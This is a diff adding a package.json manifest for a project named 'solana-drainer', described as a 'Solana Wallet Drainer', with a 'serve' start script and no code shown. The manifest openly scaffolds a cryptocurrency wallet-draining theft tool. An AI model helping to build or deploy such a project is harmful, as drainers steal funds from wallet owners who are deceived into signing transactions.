@@ -1,0 +1,12 @@
+{
+  "name": "solana-drainer",
+  "version": "1.0.0",
+  "description": "Solana Wallet Drainer",
+  "main": "index.html",
+  "scripts": {
+    "start": "serve"
+  },
+  "keywords": ["solana", "drainer", "web3"],
+  "author": "",
+  "license": "ISC"
+}
